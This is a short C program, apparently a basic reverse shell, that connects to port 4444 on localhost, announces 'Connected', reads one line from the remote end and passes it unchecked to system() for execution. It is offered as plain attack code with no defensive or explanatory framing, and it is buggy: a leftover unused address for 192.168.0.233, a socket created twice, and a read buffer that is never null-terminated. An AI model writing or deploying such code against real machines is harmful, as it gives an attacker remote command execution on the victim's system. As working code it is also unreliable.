#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

void handleRequest(char *req)
{
    system(req);
}

int main(int argc, char **argv)
{
    printf("Starting Reverse Connection\n");
    struct sockaddr_in addr;
    struct sockaddr_in srv;
    int data = 0;
    char buffer[256];
    int sockfd =socket(AF_INET,SOCK_STREAM,0);
    memset(&addr,'0',sizeof(addr));


    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.0.233");
    addr.sin_port= 8989;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("Error creating socket! Stopping...\n");
        return -9;
    }

    memset(&srv,'0',sizeof(srv));

    srv.sin_family = AF_INET;
    srv.sin_port = htons(4444);
    
    if ((inet_pton(AF_INET,"127.0.0.1",&srv.sin_addr)) <= 0)
    {
        printf("Bad address ! Stopping....\n");
        return -8;
    }

    if(connect(sockfd, (struct sockaddr *)&srv,sizeof(srv))< 0)
    {
        printf("Can't connect! Stopping...\n");
        return -6;
    }

    send(sockfd,"Connected\n", strlen("Connected\n"),0);
    data = read(sockfd,buffer,255);
    handleRequest(buffer);

    return 0;
}